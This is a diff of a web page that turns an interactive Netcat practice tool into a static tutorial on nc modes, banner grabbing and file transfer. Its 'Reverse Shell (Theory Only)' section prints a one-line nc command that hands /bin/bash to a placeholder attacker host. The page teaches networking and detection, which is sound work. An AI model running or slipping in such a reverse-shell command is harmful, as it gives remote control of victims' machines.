@@ -3,151 +3,259 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Netcat Practice</title>
+<title>Netcat – Theory & Commands</title>
 
 <style>
 :root{
-  --bg:#0b0f1a;--card:#151c38;--fg:#e8ebff;--muted:#9aa3d1;
-  --accent:#4f7cff;--border:#27306a;--err:#ff5c5c;--term:#020617;
+  --bg:#0b0f1a;
+  --panel:#151c38;
+  --fg:#e8ebff;
+  --muted:#9aa3d1;
+  --accent:#4f7cff;
+  --border:#27306a;
+  --code:#020617;
 }
 *{box-sizing:border-box}
 body{
-  margin:0;font-family:ui-monospace,Menlo,Consolas,monospace;
+  margin:0;
+  font-family: ui-monospace, Menlo, Consolas, monospace;
   background:radial-gradient(1200px 600px at 20% -10%,#141b3a 0%,var(--bg) 60%);
-  color:var(--fg)
+  color:var(--fg);
 }
 header{
-  padding:16px 24px;border-bottom:1px solid var(--border);
-  background:#0b1024
+  padding:18px 24px;
+  border-bottom:1px solid var(--border);
+  background:#0b1024;
 }
 header h1{margin:0;font-size:22px}
 header small{color:var(--muted)}
-main{max-width:900px;margin:auto;padding:24px}
-.card{
-  background:linear-gradient(180deg,var(--card),#0f1533);
-  border:1px solid var(--border);border-radius:14px;padding:20px
+
+main{
+  max-width:1000px;
+  margin:auto;
+  padding:24px;
 }
-h2{margin:0 0 14px;color:#00e5ff;font-size:16px}
-label{display:block;margin-top:10px;color:var(--muted);font-size:12px}
-input,textarea{
-  width:100%;margin-top:4px;padding:10px;border-radius:8px;
-  border:1px solid var(--border);background:#060b20;color:var(--fg)
+
+.section{
+  background:linear-gradient(180deg,var(--panel),#0f1533);
+  border:1px solid var(--border);
+  border-radius:14px;
+  margin-bottom:18px;
+  padding:20px;
 }
-textarea{min-height:80px}
-button{
-  width:100%;margin-top:14px;padding:12px;border-radius:10px;
-  border:none;background:linear-gradient(135deg,var(--accent),#2e4bff);
-  color:white;font-weight:700;cursor:pointer
+
+.section h2{
+  margin:0 0 10px;
+  color:#00e5ff;
+  font-size:17px;
 }
-pre{
-  background:linear-gradient(180deg,var(--term),#020617);
-  border:1px solid #1e293b;border-radius:12px;
-  padding:14px;height:260px;overflow:auto;font-size:13px
+
+.section p,
+.section li{
+  color:var(--muted);
+  font-size:14px;
+  line-height:1.6;
 }
-pre::before{
-  content:"terminal";display:block;color:#64748b;
-  font-size:11px;margin-bottom:6px
+
+.section ul{
+  margin:8px 0 0 18px;
 }
-.hidden{display:none}
+
+.code{
+  background:linear-gradient(180deg,var(--code),#020617);
+  border:1px solid #1e293b;
+  border-radius:12px;
+  padding:14px;
+  margin-top:12px;
+  position:relative;
+  font-size:13px;
+}
+
+.code button{
+  position:absolute;
+  top:10px;
+  right:10px;
+  background:var(--accent);
+  border:none;
+  color:white;
+  padding:4px 8px;
+  border-radius:6px;
+  cursor:pointer;
+  font-size:11px;
+}
+
+.code pre{
+  margin:0;
+  white-space:pre-wrap;
+}
 </style>
 </head>
 
 <body>
 
 <header>
-  <h1 id="title">Netcat</h1>
-  <small id="subtitle"></small>
+  <h1>Netcat (nc)</h1>
+  <small>Learn concepts first. Commands second. Execution later.</small>
 </header>
 
 <main>
 
-<!-- LISTENER -->
-<div id="listener" class="card hidden">
-<h2>Listener (nc -l)</h2>
+<section class="section">
+<h2>What is Netcat?</h2>
+<p>
+Netcat (<code>nc</code>) is a low-level networking utility that reads and writes
+data over TCP and UDP connections. It is often called the
+<b>“Swiss Army knife of networking”</b>.
+</p>
+<ul>
+  <li>Creates raw TCP/UDP connections</li>
+  <li>Works as client or listener</li>
+  <li>No encryption, no protocol parsing</li>
+</ul>
+</section>
 
-<label>Listen Port</label>
-<input id="l_port" value="4444">
+<section class="section">
+<h2>Mental Model (Important)</h2>
+<p>
+Understanding Netcat becomes easy if you remember this flow:
+</p>
+<div class="code">
+<pre>STDIN  →  Network Socket  →  STDOUT</pre>
+</div>
+<p>
+Whatever you type is sent directly over the network.
+Whatever comes back is printed to your screen.
+</p>
+</section>
 
-<button id="listen">START LISTENER</button>
+<section class="section">
+<h2>Client vs Listener Mode</h2>
 
-<pre id="l_out">—</pre>
+<p><b>Listener (waiting side)</b></p>
+<div class="code">
+<button onclick="copy(this)">COPY</button>
+<pre>nc -lvp 4444</pre>
 </div>
 
-<!-- CLIENT -->
-<div id="client" class="card hidden">
-<h2>Client (nc host port)</h2>
-
-<label>Target Host</label>
-<input id="c_host" value="127.0.0.1">
-
-<label>Target Port</label>
-<input id="c_port" value="4444">
-
-<label>Message</label>
-<textarea id="c_msg">hello</textarea>
-
-<button id="connect">CONNECT & SEND</button>
-
-<pre id="c_out">—</pre>
+<p><b>Client (connecting side)</b></p>
+<div class="code">
+<button onclick="copy(this)">COPY</button>
+<pre>nc 127.0.0.1 4444</pre>
 </div>
+
+<p>
+This mirrors real-world communication: one side waits, the other initiates.
+</p>
+</section>
+
+<section class="section">
+<h2>TCP vs UDP</h2>
+<p>
+By default, Netcat uses TCP (reliable, ordered).
+You can also use UDP:
+</p>
+<div class="code">
+<button onclick="copy(this)">COPY</button>
+<pre>nc -u host port</pre>
+</div>
+<p>
+UDP does not guarantee delivery. Silence does not always mean “closed”.
+</p>
+</section>
+
+<section class="section">
+<h2>Banner Grabbing</h2>
+<p>
+Banner grabbing is manually identifying services and versions.
+</p>
+<div class="code">
+<button onclick="copy(this)">COPY</button>
+<pre>nc target.com 80</pre>
+</div>
+
+<p>Then type:</p>
+
+<div class="code">
+<button onclick="copy(this)">COPY</button>
+<pre>GET / HTTP/1.1
+Host: target.com</pre>
+</div>
+</section>
+
+<section class="section">
+<h2>File Transfer (Concept)</h2>
+
+<p><b>Send a file</b></p>
+<div class="code">
+<button onclick="copy(this)">COPY</button>
+<pre>nc -lvp 4444 &lt; file.txt</pre>
+</div>
+
+<p><b>Receive a file</b></p>
+<div class="code">
+<button onclick="copy(this)">COPY</button>
+<pre>nc host 4444 &gt; file.txt</pre>
+</div>
+
+<p>
+This is simple but unsafe: no encryption, no integrity checks.
+</p>
+</section>
+
+<section class="section">
+<h2>Reverse Shell (Theory Only)</h2>
+<p>
+A reverse shell makes the victim connect back to the attacker,
+bypassing inbound firewall rules.
+</p>
+<div class="code">
+<pre>nc -e /bin/bash attacker_ip 4444</pre>
+</div>
+<p>
+Most modern systems disable this option for security reasons.
+</p>
+</section>
+
+<section class="section">
+<h2>Security Risks & Detection</h2>
+<ul>
+  <li>Unencrypted traffic</li>
+  <li>Often flagged by IDS/IPS</li>
+  <li>Raw socket abuse</li>
+  <li>Common attacker ports (4444, 1337)</li>
+</ul>
+</section>
+
+<section class="section">
+<h2>Netcat vs Nmap</h2>
+<p>
+Netcat is manual and raw.  
+Nmap is automated and protocol-aware.
+</p>
+<p>
+This is why Nmap is executed in this platform,
+while Netcat is taught conceptually.
+</p>
+</section>
+
+<section class="section">
+<h2>Interview-Ready Summary</h2>
+<p>
+Netcat is a low-level networking tool used for manual interaction with
+TCP and UDP services. It is powerful for debugging and testing but
+dangerous if misused due to lack of encryption and authentication.
+</p>
+</section>
 
 </main>
 
 <script>
-(() => {
-const path = location.pathname;
-
-const listenerUI = document.getElementById("listener");
-const clientUI   = document.getElementById("client");
-const title      = document.getElementById("title");
-const subtitle   = document.getElementById("subtitle");
-
-if (path.endsWith("/listener")) {
-  listenerUI.classList.remove("hidden");
-  title.textContent = "Netcat Listener";
-  subtitle.textContent = "Waiting side";
+function copy(btn){
+  const text = btn.nextElementSibling.innerText;
+  navigator.clipboard.writeText(text);
+  btn.textContent = "COPIED";
+  setTimeout(()=>btn.textContent="COPY",1000);
 }
-
-if (path.endsWith("/client")) {
-  clientUI.classList.remove("hidden");
-  title.textContent = "Netcat Client";
-  subtitle.textContent = "Connecting side";
-}
-
-/* Listener */
-document.getElementById("listen")?.addEventListener("click", async () => {
-  const out = document.getElementById("l_out");
-  out.textContent = "Listening…";
-
-  const res = await fetch("/run/netcat/listen", {
-    method:"POST",
-    headers:{ "Content-Type":"application/json" },
-    body:JSON.stringify({ port: parseInt(l_port.value) })
-  });
-
-  const data = await res.json();
-  out.textContent = data.stdout || data.stderr || "No output";
-});
-
-/* Client */
-document.getElementById("connect")?.addEventListener("click", async () => {
-  const out = document.getElementById("c_out");
-  out.textContent = "Connecting…";
-
-  const res = await fetch("/run/netcat/connect", {
-    method:"POST",
-    headers:{ "Content-Type":"application/json" },
-    body:JSON.stringify({
-      host: c_host.value,
-      port: parseInt(c_port.value),
-      message: c_msg.value
-    })
-  });
-
-  const data = await res.json();
-  out.textContent = data.stdout || data.stderr || "No output";
-});
-})();
 </script>
 
 </body>
